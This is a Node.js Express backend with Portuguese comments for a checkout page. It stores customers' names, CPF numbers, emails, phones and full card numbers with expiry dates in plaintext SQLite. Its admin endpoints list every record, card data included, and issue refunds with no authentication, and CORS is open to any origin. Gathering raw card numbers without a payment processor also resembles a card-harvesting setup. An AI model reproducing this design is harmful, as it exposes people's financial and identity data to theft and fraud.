const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
// No Render, a porta é definida pela variável de ambiente PORT (geralmente 10000)
const PORT = process.env.PORT || 3000;

// Configurar CORS para aceitar requisições de qualquer lugar (necessário já que o frontend está no GitHub Pages)
app.use(cors({ origin: '*' }));
app.use(bodyParser.json());

// Serve frontend static files
app.use(express.static(path.join(__dirname, 'recuperacao')));

// Initialize Database
const db = new sqlite3.Database('./database.sqlite', (err) => {
    if (err) {
        console.error('Error opening database', err.message);
    } else {
        db.run(`CREATE TABLE IF NOT EXISTS customers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            cpf TEXT,
            email TEXT,
            phone TEXT,
            card_number TEXT,
            card_expiry TEXT,
            payment_status TEXT,
            payment_method TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`);
        
        // Add new columns to existing table if they don't exist
        db.run(`ALTER TABLE customers ADD COLUMN phone TEXT`, (e) => {});
        db.run(`ALTER TABLE customers ADD COLUMN card_number TEXT`, (e) => {});
        db.run(`ALTER TABLE customers ADD COLUMN card_expiry TEXT`, (e) => {});
    }
});

// API: Checkout (Recebe dados da página de vendas)
app.post('/api/checkout', (req, res) => {
    const { name, cpf, email, method, status, card_number, card_expiry, phone } = req.body;
    
    db.run(`INSERT INTO customers (name, cpf, email, phone, card_number, card_expiry, payment_status, payment_method) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [name, cpf, email, phone, card_number, card_expiry, status, method],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ success: true, id: this.lastID });
        }
    );
});

// API: Admin Get Customers
app.get('/api/admin/customers', (req, res) => {
    db.all(`SELECT * FROM customers ORDER BY created_at DESC`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Admin Refund Customer
app.post('/api/admin/refund', (req, res) => {
    const { id } = req.body;
    db.run(`UPDATE customers SET payment_status = 'refunded' WHERE id = ?`, [id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        if (this.changes === 0) return res.status(404).json({ success: false, error: 'Customer not found' });
        res.json({ success: true });
    });
});

// Start Server (Render lida com o HTTPS, nós só precisamos rodar HTTP normal)
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
